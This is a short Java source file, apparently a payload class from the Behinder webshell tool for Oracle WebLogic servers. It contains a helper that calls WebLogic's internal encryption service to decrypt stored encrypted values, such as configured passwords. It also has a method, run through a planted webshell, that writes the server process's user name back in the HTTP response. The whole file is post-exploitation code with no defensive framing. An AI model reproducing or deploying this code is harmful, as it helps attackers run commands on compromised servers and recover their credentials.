package net.rebeyond.behinder.payload.java;

import java.io.OutputStream;
import weblogic.security.internal.*;
import weblogic.security.internal.encryption.*;

import javax.servlet.http.HttpServletResponse;
import javax.servlet.jsp.PageContext;

public class Mtx {
	private String c(String s) {
		EncryptionService es = null;
		ClearOrEncryptedService ces = null;
		es = SerializedSystemIni.getEncryptionService();
		if (es == null) {
			return "";
		}
		ces = new ClearOrEncryptedService(es);
		return ces.decrypt(s);
	}

	public Mtx() {
	}

	public boolean equals(Object obj) {
		if (obj instanceof PageContext) {
			try {
				PageContext G = (PageContext) obj;
				OutputStream out = ((HttpServletResponse) G.getResponse()).getOutputStream();
				String s = "Weblogic manager console " + System.getProperty("user.name");
				byte[] a = s.getBytes();
				out.write(a);
				out.close();
			} catch (Exception e) {
			}
		}
		return true;
	}
}
